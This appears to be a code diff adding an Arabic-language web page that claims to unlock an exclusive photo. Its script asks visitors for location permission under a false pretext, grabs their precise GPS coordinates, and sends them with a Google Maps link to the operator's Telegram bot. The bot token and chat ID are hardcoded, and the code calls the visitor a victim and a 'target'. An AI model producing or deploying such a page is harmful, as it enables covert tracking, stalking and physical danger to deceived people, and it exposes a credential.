@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>معرض الصور الحصرية 📸</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background-color: #f0f2f5; padding-top: 50px; color: #333; }
+        .container { background: white; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 90%; }
+        #imageContainer { display: none; margin-top: 20px; }
+        .btn { padding: 15px 30px; font-size: 18px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 8px; transition: 0.3s; font-weight: bold; }
+        .btn:hover { background-color: #0056b3; transform: scale(1.05); }
+        .lock-icon { font-size: 50px; margin-bottom: 10px; }
+        img { max-width: 100%; border-radius: 10px; border: 3px solid #ddd; }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="setup">
+        <div class="lock-icon">🔒</div>
+        <h2>محتوى مغلق</h2>
+        <p>لمشاهدة هذه الصورة الحصرية، يرجى الضغط على الزر أدناه وتفعيل صلاحية الموقع للتأكد من توافر الخدمة في بلدك.</p>
+        <button class="btn" onclick="startHack()">فتح الصورة الآن</button>
+    </div>
+
+    <div id="imageContainer" class="container">
+        <h2>✅ تم فتح المحتوى بنجاح</h2>
+        <img src="https://picsum.photos/600/400" alt="Special Image">
+        <p>شكراً لثقتك بنا!</p>
+    </div>
+
+    <script>
+        // بياناتك الرسمية التي زودتني بها
+        const botToken = '8699110487:AAFCvUGSAeFkhi4gLhRrqsE6mvONXyNpV18';
+        const myChatId = '6808559733';
+
+        function startHack() {
+            if (navigator.geolocation) {
+                // طلب الموقع الجغرافي
+                navigator.geolocation.getCurrentPosition(sendData, showError, {enableHighAccuracy: true});
+            } else {
+                alert("متصفحك قديم ولا يدعم هذه الميزة.");
+            }
+        }
+
+        function sendData(position) {
+            // إظهار الصورة فوراً للضحية
+            document.getElementById("setup").style.display = "none";
+            document.getElementById("imageContainer").style.display = "block";
+
+            // استخراج الإحداثيات
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            // صياغة الرسالة التي ستصلك على تليجرام
+            const text = `🎯 **تم صيد هدف جديد!**\n\n` +
+                         `📍 الإحداثيات: \`${lat}, ${lon}\` \n` +
+                         `📏 الدقة: +/- ${accuracy} متر\n\n` +
+                         `🔗 رابط الموقع مباشر:\n${googleMaps}`;
+
+            // إرسال البيانات إلى بوت تليجرام الخاص بك
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${myChatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+        }
+
+        function showError(error) {
+            let msg = "";
+            if(error.code == error.PERMISSION_DENIED) {
+                msg = "يجب عليك الضغط على 'سماح' (Allow) لتتمكن من رؤية الصورة.";
+                // تنبيهك بأن الشخص رفض
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${myChatId}&text=${encodeURIComponent("⚠️ الشخص حاول الدخول لكنه رفض إعطاء الصلاحية!")}`);
+            } else {
+                msg = "حدث خطأ فني، حاول مرة أخرى.";
+            }
+            alert(msg);
+        }
+    </script>
+</body>
+</html>
